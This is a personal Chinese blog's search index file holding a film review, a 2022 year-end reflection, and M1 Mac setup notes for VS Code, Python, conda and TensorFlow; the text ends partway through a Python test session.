<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>《宇宙探索编辑部》：一首浪漫的哲学散文诗</title>
      <link href="/2023/%E3%80%8A%E5%AE%87%E5%AE%99%E6%8E%A2%E7%B4%A2%E7%BC%96%E8%BE%91%E9%83%A8%E3%80%8B%EF%BC%9A%E4%B8%80%E9%A6%96%E6%B5%AA%E6%BC%AB%E7%9A%84%E5%93%B2%E5%AD%A6%E6%95%A3%E6%96%87%E8%AF%97/"/>
      <url>/2023/%E3%80%8A%E5%AE%87%E5%AE%99%E6%8E%A2%E7%B4%A2%E7%BC%96%E8%BE%91%E9%83%A8%E3%80%8B%EF%BC%9A%E4%B8%80%E9%A6%96%E6%B5%AA%E6%BC%AB%E7%9A%84%E5%93%B2%E5%AD%A6%E6%95%A3%E6%96%87%E8%AF%97/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这不是普通的电视雪花，它是宇宙爆炸时的余晖。</p></blockquote><p>这是一部小众的文艺科幻片，讲述了唐志军，作为一名宇宙探索编辑部的中年男人，对外星人的探索之路。<br>影片是以一种伪纪录片的拍摄手法记录的，前半部分镜头的摇移比较多，会比较晃，后半段导演就避免了这种手法。</p><p>影片中有很多有意思的隐喻，很难说这部电影的内核是悲剧还是喜剧。唐志军是一个偏执的人，他对外星人的存在坚信不疑，为此，他将所有的精力都投入到外星人的探索中，花费了很多钱。“男读《探索》，女读《知音》”，这部分钱是从宇宙探索编辑部出，上个世纪《探索》杂志是非常火的，顺应开蒙的民智。但是如今，传统纸质杂志早已日暮西山，编辑部也只在一个嘈杂的四合院中租了一间房间当做办公室，收入来源几乎没有。在这种情况下，为了探索四川地区出现的超自然现象，他卖掉了当年从特殊渠道搞到的宇航服，带着秦老师、那日苏、女孩晓晓毅然出发。</p><p>这一路上，他们碰到了很多人，神出鬼没的陨石猎人，抱着宇宙功德箱的山东农民，戴着锅盔的孙一通。唐志军就像那个被胡萝卜吸引的驴，只要有发现外星人的可能，他就会不知疲倦的前进。他花了 520 元，买了一根看起来像橡胶骨头的外星人腿骨；他去孙一通家住着，等到了麻雀落满石狮；蜀道难，他带着一群人去西南深处追逐 UFO。</p><p>故事荒诞离奇，却让人感到心酸。唐志军的女儿，患抑郁症自杀了。他说，他不理解，不原谅。彩荣姐说，我想通了，就是你没想通。 唐志军为什么仍然苦苦追寻外星人，没人知道，或许是为了问女儿自杀前问他的那个问题，「人类存在于宇宙的意义是什么？」他想找到外星人，问问它们是怎么想的。 所以在他得知孙一通能和外星人交流的时候，他终于说出了这个埋在心底的，未解的问题。</p><p>然而孙一通回答道，「如果外星人不知道呢，或者说，他们来地球的目的也是为了寻求这个问题的答案呢。」</p><p>是啊。如果这个问题没有答案。那么就在宇宙中心呼唤爱。</p><p>影片是科幻的，是癫狂的，以一种唐吉坷德式的叙事将影片推向最高潮。唐志军最后孤身一人深入，找到了丢失的驴，看到了墙上的壁画，见到了被麻雀包围的孙一通，那个手拿一人高骨杖的孙一通，回音久久不绝。</p><p>是的，只有他一个人，最终见到了外星人。</p><p>他终于释怀，这么多年的追逐总归有了结果，那个未解的问题也许就藏在诗中。</p><blockquote><p>一望无际的梦里<br>用碗里的米垒墙<br>乌云写满咒语<br>遮住众生疲惫的骨头<br>狐狸在山坡念念有词<br>灶台上的年兽反复冬眠<br>晨昏线割开大地的指纹<br>水草缠住风 冻结梦境的递归<br>胸口的鸟群<br>绕过十万个太阳<br>带走被浇灭的闪电<br>带走云层潮汐<br>带走神明的悄悄话<br>带走落地生根的锚<br>带走氧化的情歌<br>带走山野恩仇<br>带走金银财宝<br>带走痴心妄想<br>带走梦游的脚印<br>带走飞蛾扑不灭的火<br>带走所有人的名字<br>带走彩虹的化石</p></blockquote><p>老唐回来了，解散了编辑部，什么也没说。或许他知道，这经历太离奇，不会有人相信。他在侄子的婚礼致辞里，这样说道，</p><p>「一个月之前我做了一个梦，应该是场梦。我和我的一位朋友在山洞里面被一群麻雀带着，一直飞，飞得很高，飞出了大气层，飞到了外太空，后来周围是一片黑暗，什么光都没有。<br>朋友对我说，这就是宇宙的尽头。他要继续往前走，而我就只能到这。<br>我只好转身，可当我转过身之后，我看到的是整个宇宙的轮廓 。<br>其实我们人类一直没有弄明白，就是为什么而存在，我们人类又是为什么而存在的。可是就在那一刻，那个轮廓让我觉得我好像找到了答案，不在外面，不在宇宙深处，而在我们每一个人的身体里，原来我们每个人既是存在的谜题，也是这个谜题的答案。<br>后来我就把我看到了宇宙的样子印在了我工作的杂志社休刊前最后一期的封面上，那个轮廓让我觉得如果宇宙是一首诗的话，我们每一个人都是组成这首诗的一个个文字，我们繁衍不息，彼此相爱，然后我们这一个个字就变成了一个又一个的句子，这首诗就能一直写下去了。<br>当这首诗写得足够长，总有一天我们可以在这首宇宙之诗里，懂得我们存在的意义 。」</p><p>天外来客何处寻，梦里花落知多少。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
            <tag> 观后感 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-年终总结</title>
      <link href="/2023/2022-%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
      <url>/2023/2022-%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>今天是 2023 年 1 月 1 日，我在家里写下 2022 年的年终总结。</p><a id="more"></a><p>一月的青岛，窗外阳光很明艳，但是走出去还是冷酷的冬天基调。</p><p>前一段时间阳了，刚刚恢复，对于新冠，对于国家，有很多话想说，却很难都写下来。</p><p>那就先回忆一下过去的 2022 吧，这一年过得可真快。</p><blockquote><p>世界在旋转，我们跌跌撞撞前进，这就够了。</p></blockquote><h1 id="西电·大四"><a href="#西电·大四" class="headerlink" title="西电·大四"></a>西电·大四</h1><p>年初的时候，还是大四，经历了西安的封城，赶在过年前的一个周回家。</p><p>大四，很开心的一段时光。去玩，去体验，去经历，在最有活力的年纪里。去见识不同的山川，去触摸不同的风光。</p><p>夏天的风，会永远记得这场青春片段。</p><p>那段日子，有疫情防控，有核酸检测，有大白，但我过的很安心，我可以放心的去商场，去吃饭，去坐地铁，除了审批报备，我的生活没有太多的影响。</p><p>2022 的风，送走了夏日的酷暑，我的本科生活也就这样结束了。</p><blockquote><p>時光的河入海流 終於我們分頭走<br>沒有哪個港口 是永遠的停留<br>很欣慰生命某段時刻<br>曾一起渡過</p></blockquote><h1 id="动荡·挑战"><a href="#动荡·挑战" class="headerlink" title="动荡·挑战"></a>动荡·挑战</h1><p>在并不安稳的 2022 里，我们目睹并感受着自身与世界的变化。</p><p>北京冬奥，俄乌战争，上海封城，佩洛西窜访台湾，台海军演，九月英国女王伊丽莎白二世去世，十一月中国前领导人江泽民同志去世，“A4”纸风波，疫情防控全面放开，行程码下线，停止全民核酸，不再查验健康码。</p><p>这些也许只是历史长河的一朵浪花，当然还有很多事情，会被人们遗忘。</p><p>在汹涌的潮水中坚定自身并不容易，但一切终将会过去，我们终会穿过雾霭抵达新的光景。</p><p>这一年，极端热浪席卷全球，平均气温再次刷新历史纪录，全国多地打破持续 40 度高温记录；人类达到 80 亿；“夸父一号”开启太阳探测之旅；中国第三艘航空母舰“福建舰”下水；中国空间站历史性完成“合体”；地外存在“生命之源”首次确认。</p><p>没有一年是不平凡的，在新旧交叠的光晕里继续前行，美好的收藏，失落的缝合，坍塌的重建。</p><p>谁也没有想到，在 2022 年的最后一个月，中国完全放开。所有人都措手不及，毕竟十一月刚刚发布“新二十条”规定，一个月的时间，政府的态度居然 180 度转弯。奥秘克戎这样一个 R=20 的病毒，在十四亿人的培养皿中迅速传播，北京 2000 万人口，一个月内可以感染 80%，青岛，第一个公开疫情数据的城市，单日新增 50 万感染者。这个冬天，并不好过。</p><p>生离死别，会在未来的很长一段时间内，在中国。老人、有基础病的人群、孩子，是社会中最脆弱的群体，病毒来势汹汹，他们本应被保护的很好。但是被放弃了。我很痛心。</p><p>不知道未来有多远，但真的希望 2023 是个好年。希望所有坎坷都是未来惊喜的铺陈，所有明亮都将降落在充满祈盼的明日。</p><blockquote><p>每个冬天的句点都是春暖花开。</p></blockquote><p>继续吧，去爱，去生活，去紧握一些具体而确凿的事物，去续写旧的故事，开启新的篇章。</p><p>2023 年，新年快乐，平安顺遂。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1629942/1672662203862-d3cfc7a7-539f-4a1f-9586-ba1286e5d87a.png#averageHue=%2397231e&clientId=u7f436b7b-ccb5-4&from=paste&height=514&id=uc76bb998&name=image.png&originHeight=1028&originWidth=760&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=276531&status=done&style=none&taskId=u5945e99b-9e9b-4700-adcb-34e54171c95&title=&width=380" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 年终总结 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>科研路上（1）</title>
      <link href="/2022/%E7%A7%91%E7%A0%94%E8%B7%AF%E4%B8%8A%EF%BC%881%EF%BC%89/"/>
      <url>/2022/%E7%A7%91%E7%A0%94%E8%B7%AF%E4%B8%8A%EF%BC%881%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>写点什么，记录一下。</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不知道插件出现了什么问题，写的文章没有更新上去。</p>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bright autumn time</title>
      <link href="/2022/Bright%20autumn%20time/"/>
      <url>/2022/Bright%20autumn%20time/</url>
      
        <content type="html"><![CDATA[<p>东区时光，喜欢这样干净而明朗的日子。</p><a id="more"></a><p>开心 🍂<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1667633376795-14c882a2-651d-4a66-b03e-4aabd860549f.png#averageHue=%235f939d&clientId=u1e335767-70e8-4&from=paste&height=1050&id=u272fa64b&name=image.png&originHeight=2100&originWidth=1610&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=5617325&status=done&style=none&taskId=uf7e8052a-99ef-40c8-8042-cafd143c989&title=&width=805" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小确幸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装vscode并配置环境</title>
      <link href="/2022/%E5%AE%89%E8%A3%85vscode%E5%B9%B6%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83/"/>
      <url>/2022/%E5%AE%89%E8%A3%85vscode%E5%B9%B6%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h1 id="c-c"><a href="#c-c" class="headerlink" title="c/c++"></a>c/c++</h1><p>参考：</p><ul><li><a href="https://blog.csdn.net/qq_35926606/article/details/116018953">https://blog.csdn.net/qq_35926606/article/details/116018953</a></li><li><a href="https://blog.csdn.net/qq_45596100/article/details/121114828">https://blog.csdn.net/qq_45596100/article/details/121114828</a></li><li><a href="https://blog.csdn.net/IAMoldpan/article/details/119978907">https://blog.csdn.net/IAMoldpan/article/details/119978907</a></li></ul><p>首先是下载几个插件。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062567837-7eabd8ef-0de2-48a2-bd86-51c453d4ec92.png#id=sXGWi&originHeight=732&originWidth=498&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>然后，codeLLDB 会要求下载一个 package，直接在 vscode 里下载巨慢无比，我就去 github 直接下载了，然后这样子安装：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062567944-adec4fb5-ebcc-4b87-a61d-4fd206b046bc.png#id=Tp5Tj&originHeight=564&originWidth=838&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>然后新建 cpp 文件。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062568040-07844546-5aad-4dc8-9e1b-fe5ff042570d.png#id=BMoSM&originHeight=666&originWidth=2110&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p><h2 id="1-配置-tasks-json-文件"><a href="#1-配置-tasks-json-文件" class="headerlink" title="1.配置 tasks.json 文件"></a>1.配置 tasks.json 文件</h2><p>首先，点击顶部菜单栏中的终端—配置默认生成任务—C/C++ clang++，此时会生成一个 tasks.json 文件，这个文件是默认生成的，需要修改其中的 args 选项，添加一个”-std=c++17”,，修改如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JSON">&quot;args&quot;: [<br>  &quot;-fdiagnostics-color=always&quot;,<br>  &quot;-g&quot;,<br>  &quot;$&#123;file&#125;&quot;,<br>  &quot;-std=c++17&quot;,<br>  &quot;-o&quot;,<br>  <span class="hljs-string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;&quot;</span><br>]<br></code></pre></td></tr></table></figure><h2 id="2-配置-c-cpp-properties-json-文件"><a href="#2-配置-c-cpp-properties-json-文件" class="headerlink" title="2.配置 c_cpp_properties.json 文件"></a>2.配置 c_cpp_properties.json 文件</h2><p>使用组合键 shift+command+p 调出 C/C++:编辑配置（json），此时会自动生成一个 c_cpp_properties.json 文件。<br>修改编译器为 clang++：<br>将”compilerPath”: “/usr/bin/clang”,修改为”compilerPath”: “/usr/bin/clang++”,<br>修改 C 标准为 C17：<br>将”cppStandard”: “c98”,修改为”cppStandard”: “c17”,</p><blockquote><p>注意，上面那个组合键和番茄 todo 的专注快捷键冲突了，但是它不会报错。。。我按了好几遍都没出来差点怀疑人生。</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062568171-ad7d9ec1-3b43-4aaf-8f32-8d81736d8237.png#id=Xv4Dp&originHeight=828&originWidth=1648&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>然后配置完成后，点击顶部菜单栏中的终端—运行生成任务，此时会生成一个二进制文件，右键这个二进制文件，点击在终端中打开，键入./你的二进制文件名，即可看到输出结果。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062568265-38fff787-0188-46dc-864e-6090f8f7d417.png#id=y5JKm&originHeight=406&originWidth=952&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p><h2 id="3-Debug-调试"><a href="#3-Debug-调试" class="headerlink" title="3.Debug 调试"></a>3.Debug 调试</h2><p>点击顶部菜单栏中的运行—添加配置—C++(GDB/LLDB)—clang++ 生成活动文件，会生成一个 launch.json 文件。<br>在文件中将”type”: “cppdbg”,修改为”type”: “lldb”,<br>到此，所有配置工作均完成。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062568360-b580675d-4637-4d64-ab60-6067751dd9dd.png#id=gMnzj&originHeight=596&originWidth=1014&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>大功告成。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062568431-e7291774-4e92-4f01-88a2-ce6d2745cc2e.png#id=MR86D&originHeight=1580&originWidth=2184&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>然后设置了一下，可以让 vscode 调试的时候调用外部的 terminal，试了一下感觉没啥用，就换回去了。</p>]]></content>
      
      
      <categories>
          
          <category> mac </category>
          
          <category> m1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 踩坑教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编程环境搭建</title>
      <link href="/2022/%E7%BC%96%E7%A8%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2022/%E7%BC%96%E7%A8%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>写在前面，本文主要基于<a href="https://f5soft.site/zh/notes/2021/0214/">https://f5soft.site/zh/notes/2021/0214/</a> 一文写成，用于记录安装过程中遇到的各种问题，便于日后快速复盘。</p><h1 id="安装-python"><a href="#安装-python" class="headerlink" title="安装 python"></a>安装 python</h1><p>通过 Homebrew 安装 python3.9。<br>系统自带 python2.7 和 python3.8.9,这个作者说安装一下原生支持 arm 的 python,于是我就安装了。<br>通过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">brew install python3<br></code></pre></td></tr></table></figure><p>即可安装 arm 版本的 3.9.1，其路径在<code>/opt/homebrew/bin/python3</code>。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062541079-c7a63b17-c596-481e-89fc-2e78de862d95.png#id=pUMSX&originHeight=674&originWidth=1434&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>安装好之后，需要通过<code>pip3</code>安装一些基本的第三方库。由于这里是 macos-arm64 平台，因此很多库都没有来得及提供该平台的 wheel，导致很多库都需要通过手动编译安装，而且编译过程往往出错。下面是常用库的 arm 版本的安装方法整理：</p><table><thead><tr><th>库名称</th><th>pip3 install 是否需要编译，编译是否成功</th><th>安装方法</th></tr></thead><tbody><tr><td>numpy</td><td>需要编译，安装成功</td><td></td></tr><tr><td>scipy</td><td>不知道是不是高铁上网不好，pip 失败</td><td>brew install scipy</td></tr><tr><td>matplotlib</td><td>需要编译，安装成功</td><td></td></tr><tr><td>pandas</td><td>成功</td><td></td></tr><tr><td>sympy</td><td>成功</td><td></td></tr><tr><td>cv2</td><td>无相应轮子</td><td>brew install opencv (花了巨长时间下载）python 里面 import cv2 即可验证</td></tr><tr><td>pycrypto</td><td>编译成功</td><td></td></tr><tr><td>requests</td><td>编译成功</td><td></td></tr><tr><td>jupyter</td><td>编译成功</td><td></td></tr><tr><td>scapy</td><td>编译成功</td><td></td></tr><tr><td>regex</td><td>直接安装</td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><p>首先是 numpy，我一开始使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">matr1x@matr1xdeMacBook-Air ~ % pip3 install numpy<br></code></pre></td></tr></table></figure><p>调用的是系统自带的 python3.8 的 pip3，然后它被安装在了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062541291-32f78767-b268-40cb-a8a3-7ee831486c64.png#id=MRnLV&originHeight=852&originWidth=1698&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>然后，我发现其实 brew 下也是有 pip3 和 pip3.9 的，应该是 pip3 的顺序系统的比较靠前，然后我使用了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">matr1x@matr1xdeMacBook-Air ~ % <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;eval &quot;$(/opt/homebrew/bin/brew shellenv)&quot;&#x27;</span> &gt;&gt; ~/.zprofile<br>matr1x@matr1xdeMacBook-Air ~ % <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(/opt/homebrew/bin/brew shellenv)</span>&quot;</span><br></code></pre></td></tr></table></figure><p>此时发现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">matr1x@matr1xdeMacBook-Air ~ % <span class="hljs-built_in">which</span> pip3<br>/opt/homebrew/bin/pip3<br></code></pre></td></tr></table></figure><p>再次运行<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062541453-80d31bf3-847b-4ebb-ad3e-5e2ae156ff6d.png#id=Lp3x7&originHeight=424&originWidth=1708&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>此时查看路径<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062541562-605a738a-5482-4757-8967-9478682d10c7.png#id=G6Syu&originHeight=322&originWidth=1302&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p><h1 id="安装-conda"><a href="#安装-conda" class="headerlink" title="安装 conda"></a>安装 conda</h1><p>由于 Anaconda 没有支持 arm，但是 miniforge 已经支持。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">brew install --cask miniforge<br></code></pre></td></tr></table></figure><p>自动链接，查看结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs Bash">matr1x@matr1xdeMacBook-Air ~ % conda list<br><span class="hljs-comment"># packages in environment at /opt/homebrew/Caskroom/miniforge/base:</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Name                    Version                   Build  Channel</span><br>brotlipy                  0.7.0           py39h5161555_1003    conda-forge<br>ca-certificates           2021.10.8            h4653dfc_0    conda-forge<br>certifi                   2021.10.8        py39h2804cbe_1    conda-forge<br>cffi                      1.15.0           py39h52b1de0_0    conda-forge<br>charset-normalizer        2.0.9              pyhd8ed1ab_0    conda-forge<br>colorama                  0.4.4              pyh9f0ad1d_0    conda-forge<br>conda                     4.11.0           py39h2804cbe_0    conda-forge<br>conda-package-handling    1.7.3            py39h5161555_1    conda-forge<br>cryptography              36.0.0           py39hfb8cd70_0    conda-forge<br>idna                      3.1                pyhd3deb0d_0    conda-forge<br>libffi                    3.4.2                h3422bc3_5    conda-forge<br>libzlib                   1.2.11            hee7b306_1013    conda-forge<br>ncurses                   6.2                  h9aa5885_4    conda-forge<br>openssl                   1.1.1l               h3422bc3_0    conda-forge<br>pip                       21.3.1             pyhd8ed1ab_0    conda-forge<br>pycosat                   0.6.3           py39h5161555_1009    conda-forge<br>pycparser                 2.21               pyhd8ed1ab_0    conda-forge<br>pyopenssl                 21.0.0             pyhd8ed1ab_0    conda-forge<br>pysocks                   1.7.1            py39h2804cbe_4    conda-forge<br>python                    3.9.7           h54d631c_3_cpython    conda-forge<br>python_abi                3.9                      2_cp39    conda-forge<br>readline                  8.1                  hedafd6a_0    conda-forge<br>requests                  2.26.0             pyhd8ed1ab_1    conda-forge<br>ruamel_yaml               0.15.80         py39h5161555_1006    conda-forge<br>setuptools                59.4.0           py39h2804cbe_0    conda-forge<br>six                       1.16.0             pyh6c4a22f_0    conda-forge<br>sqlite                    3.37.0               h72a2b83_0    conda-forge<br>tk                        8.6.11               he1e0b03_1    conda-forge<br>tqdm                      4.62.3             pyhd8ed1ab_0    conda-forge<br>tzdata                    2021e                he74cb21_0    conda-forge<br>urllib3                   1.26.7             pyhd8ed1ab_0    conda-forge<br>wheel                     0.37.0             pyhd8ed1ab_1    conda-forge<br>xz                        5.2.5                h642e427_1    conda-forge<br>yaml                      0.2.5                h642e427_0    conda-forge<br>zlib                      1.2.11            hee7b306_1013    conda-forge<br></code></pre></td></tr></table></figure><p>可以看到和 pip3 的相比少了很多库。暂时没找到相应的简单方法，只能创建虚拟环境的时候再下一遍了。</p><h1 id="安装-tensorflow2-4"><a href="#安装-tensorflow2-4" class="headerlink" title="安装 tensorflow2.4"></a>安装 tensorflow2.4</h1><p>亲测有效，但无法调用 GPU。<br><a href="https://_www.cnblogs.com_practitioners_p_15514567/">https://www.cnblogs.com/practitioners/p/15514567.html</a><br>先创建 yml，注意，用 vscode 创建。（系统自带的文本编辑器只能导出 trf 格式的文件，很离谱）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs Bash">name: apple_tensorflow<br>  channels:<br>    - conda-forge<br>    - nodefaults<br>  dependencies:<br>    - grpcio<br>    - h5py<br>    - ipython<br>    - numpy<br>    - pip=20.2.4<br>    - python=3.8<br>    - scipy<br>    - termcolor<br>    - typeguard<br>    - wheel<br>    - absl-py<br>    - astunparse<br>    - python-flatbuffers<br>    - gast<br>    - google-pasta<br>    - keras-preprocessing<br>    - opt_einsum<br>    - protobuf<br>    - tensorboard<br>    - tensorflow-estimator<br>    - termcolor<br>    - typing_extensions<br>    - wrapt<br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">conda env create --file=/Users/matr1x/Documents/env.yml  --name=tensorflow<br></code></pre></td></tr></table></figure><p>之后激活并安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">(base) matr1x@matr1xdeMacBook-Air ~ % conda activate tensorflow<br>(tensorflow) matr1x@matr1xdeMacBook-Air ~ % pip install --upgrade --force --no-dependencies https://github.com/apple/tensorflow_macos/releases/download/v0.1alpha3/tensorflow_macos-0.1a3-cp38-cp38-macosx_11_0_arm64.whl https://github.com/apple/tensorflow_macos/releases/download/v0.1alpha3/tensorflow_addons_macos-0.1a3-cp38-cp38-macosx_11_0_arm64.whl<br></code></pre></td></tr></table></figure><p>测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs Python">(tensorflow) matr1x@matr1xdeMacBook-Air ~ % python<br>Python <span class="hljs-number">3.8</span><span class="hljs-number">.12</span> | packaged by conda-forge | (default, Oct <span class="hljs-number">12</span> <span class="hljs-number">2021</span>, <span class="hljs-number">21</span>:<span class="hljs-number">21</span>:<span class="hljs-number">17</span>)<br>[Clang <span class="hljs-number">11.1</span><span class="hljs-number">.0</span> ] on darwin<br>Type <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf<br><span class="hljs-meta">&gt;&gt;&gt; </span>print(tf.__version__)<br><span class="hljs-number">2.4</span><span class="hljs-number">.0</span>-rc0<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> tensorflow.keras <span class="hljs-keyword">import</span> layers<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> tensorflow.keras <span class="hljs-keyword">import</span> models<br><span class="hljs-meta">&gt;&gt;&gt; </span>model = models.Sequential()<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.add(layers.Conv2D(<span class="hljs-number">32</span>, (<span class="hljs-number">3</span>, <span class="hljs-number">3</span>), activation=<span class="hljs-string">&#x27;relu&#x27;</span>, input_shape=(<span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1</span>)))<br><span 